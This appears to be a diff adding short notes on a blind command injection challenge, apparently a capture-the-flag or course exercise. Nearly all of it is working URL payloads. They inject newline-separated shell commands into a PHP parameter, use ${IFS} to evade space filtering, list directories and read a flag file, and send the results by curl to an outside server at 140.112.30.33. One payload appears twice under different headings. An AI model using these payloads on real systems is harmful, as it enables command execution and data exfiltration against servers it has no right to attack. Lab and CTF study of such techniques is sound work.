@@ -1,0 +1,30 @@
+###Blind command injection###
+###must forward result to remote server to see it
+###Start up http server with npm package if not provided with root previledge
+
+
+
+### Sol 1
+##  ls dir option1
+#   %0a = '\n'
+#   ${IFS} = ' '  (other substitutes for ' ' are '\t' etc.)
+#   ${A:17} is referencing A[17:]
+
+http://edu.kaibro.tw:7777/index.php?h=%0aA=$(ls${IFS}/)%0acurl${IFS}http://140.112.30.33:8080/$(echo${IFS}${A:17})
+
+##  ls dir option2
+#   TIPS : urlencode can eliminate space and special characters in strings
+#   lifting the need to search for substring in response
+
+http://edu.kaibro.tw:7777/index.php?h=%0aA=$(ls${IFS}/)%0acurl${IFS}-G${IFS}-v${IFS}http://140.112.30.33:8080${IFS}--data-urlencode${IFS}"$(echo${IFS}$A)"
+
+##  cat flag
+
+http://edu.kaibro.tw:7777/index.php?h=%0aA=$(cat${IFS}/flag_s35uisf78h23nndiuf)%0acurl${IFS}http://140.112.30.33:8080/$(echo${IFS}${A})
+
+
+### Sol2
+##  cat entire directory
+
+http://edu.kaibro.tw:7777/index.php?h=%0aA=$(cat${IFS}/flag_s35uisf78h23nndiuf)%0acurl${IFS}http://140.112.30.33:8080/$(echo${IFS}${A})
+
